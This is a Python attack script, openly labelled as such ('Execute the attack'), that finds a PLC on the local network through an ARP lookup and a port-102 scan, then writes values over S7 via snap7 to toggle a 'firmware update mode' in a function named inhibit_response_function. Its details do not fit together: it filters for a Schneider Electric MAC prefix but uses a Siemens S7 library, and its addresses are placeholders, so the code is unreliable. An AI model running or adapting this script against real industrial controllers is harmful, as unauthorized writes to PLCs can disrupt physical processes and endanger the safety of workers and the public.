import snap7
import socket
import struct
import time

# Configuration
PLC_IP = None # Will be discovered
PLC_RACK = 0
PLC_SLOT = 1
# Define the memory area and byte offset where the "force update" command is written
# These will need to be determined based on your PLC program. Replace with actual values.
DB_NUMBER = 1  # Example: Data Block 1
START_ADDRESS = 0  # Example: Start at byte 0
BYTE_OFFSET = 0  # Byte Offset within DB
DATA_TYPE = 'bool' # Data type for the update command. Can be bool, int, real, etc.
FORCE_UPDATE_VALUE_ON = True  # Value to write to activate firmware update mode
FORCE_UPDATE_VALUE_OFF = False # Value to write to deactivate firmware update mode

# Delay to allow PLC to process commands (adjust as needed)
COMMAND_DELAY = 2  # seconds

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network.

    This is a basic implementation and might not work in all network configurations.
    A more robust solution might involve using dedicated industrial network discovery tools.
    """
    global PLC_IP

    #Try getting the IP using arp table. This will only work if there is recent communication with the PLC
    try:
        import subprocess
        arp_output = subprocess.check_output("arp -a", shell=True).decode("utf-8")
        #Look for Schneider Electric MAC prefix (00-80-F4)
        for line in arp_output.splitlines():
            if "00-80-f4" in line.lower():
                PLC_IP = line.split()[1]
                print(f"PLC IP address found via ARP table: {PLC_IP}")
                return
    except Exception as e:
        print(f"Error getting PLC's IP using ARP table: {e}")

    #Basic Network scan
    try:
        my_ip = socket.gethostbyname(socket.gethostname())
        network_prefix = '.'.join(my_ip.split('.')[:-1]) + '.'
        print(f"Scanning network {network_prefix}.* for PLC...")
        for i in range(1, 255):
            ip = network_prefix + str(i)
            try:
                # Create a socket and attempt to connect to port 102 (S7 communication)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)  # Short timeout
                result = sock.connect_ex((ip, 102))
                if result == 0:
                    # Port 102 is open, potentially a PLC
                    print(f"Potential PLC found at: {ip}")
                    #Quickly try S7Comm test
                    try:
                        client = snap7.client.Client()
                        client.connect(ip, PLC_RACK, PLC_SLOT)
                        client.disconnect()
                        PLC_IP = ip
                        print(f"Confirmed PLC IP: {PLC_IP}")
                        sock.close()
                        return
                    except Exception as e:
                        print(f"S7Comm Test failed for {ip}: {e}")


                sock.close()
            except Exception as e:
                #print(f"Error scanning {ip}: {e}") #Remove for silent operation

                pass  # Ignore connection errors
    except Exception as e:
        print(f"Error during network scan: {e}")
    print("PLC IP address not automatically found. Please manually set the PLC_IP variable.")

def write_data(client, db_number, start_address, byte_offset, data_type, value):
    """Writes data to the PLC."""
    try:
        if data_type.lower() == 'bool':
             # Read the existing byte
            read_data = client.db_read(db_number, start_address, 1)

            # Get the bit position within the byte
            bit_position = byte_offset % 8

            # Create a mask to clear the specific bit
            mask = ~(1 << bit_position) & 0xFF

            # Clear the specific bit in the byte
            read_data[0] &= mask

            # Set the bit if the value is True
            if value:
                read_data[0] |= (1 << bit_position)
            client.db_write(db_number, start_address, read_data)
            print(f"Successfully wrote Bool {value} to DB{db_number}.{start_address}.{byte_offset} ")

        elif data_type.lower() == 'int':
            data = struct.pack(">h", value)  # Assuming 2-byte integer (adjust format string if needed)
            client.db_write(db_number, start_address + byte_offset, data)
            print(f"Successfully wrote Int {value} to DB{db_number}.{start_address}.{byte_offset}")
        elif data_type.lower() == 'real':
            data = struct.pack(">f", value)
            client.db_write(db_number, start_address + byte_offset, data)
            print(f"Successfully wrote Real {value} to DB{db_number}.{start_address}.{byte_offset}")
        else:
            print(f"Unsupported data type: {data_type}")

    except Exception as e:
        print(f"Error writing to PLC: {e}")


def inhibit_response_function(plc_ip, rack, slot, db_number, start_address, byte_offset, data_type, force_update_value_on, force_update_value_off, command_delay):
    """Activates and deactivates firmware update mode on a Schneider Electric PLC.

    Args:
        plc_ip (str): The IP address of the PLC.
        rack (int): The rack number of the PLC.
        slot (int): The slot number of the PLC.
        db_number (int): The Data Block number where the "force update" command is located.
        start_address (int): The starting address within the Data Block.
        byte_offset (int): The byte offset within the Datablock
        data_type (str): The data type of the force update variable (e.g., 'bool', 'int', 'real').
        force_update_value_on (any): The value to write to activate firmware update mode.
        force_update_value_off (any): The value to write to deactivate firmware update mode.
        command_delay (int): Delay in seconds between commands.
    """
    try:
        client = snap7.client.Client()
        client.connect(plc_ip, rack, slot)
        print(f"Connected to PLC at {plc_ip}")

        # Activate Firmware Update Mode
        print("Activating Firmware Update Mode...")
        write_data(client, db_number, start_address, byte_offset, data_type, force_update_value_on)
        time.sleep(command_delay)

        # Deactivate Firmware Update Mode (after a delay or some other action)
        print("Deactivating Firmware Update Mode...")
        write_data(client, db_number, start_address, byte_offset, data_type, force_update_value_off)
        time.sleep(command_delay)


    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'client' in locals() and client.get_connected():
            client.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    # Discover the PLC's IP address
    if PLC_IP is None:
        find_plc_ip()

        if PLC_IP is None:
            print("PLC IP address not found.  Exiting.")
            exit()

    # Execute the attack
    inhibit_response_function(PLC_IP, PLC_RACK, PLC_SLOT, DB_NUMBER, START_ADDRESS, BYTE_OFFSET, DATA_TYPE, FORCE_UPDATE_VALUE_ON, FORCE_UPDATE_VALUE_OFF, COMMAND_DELAY)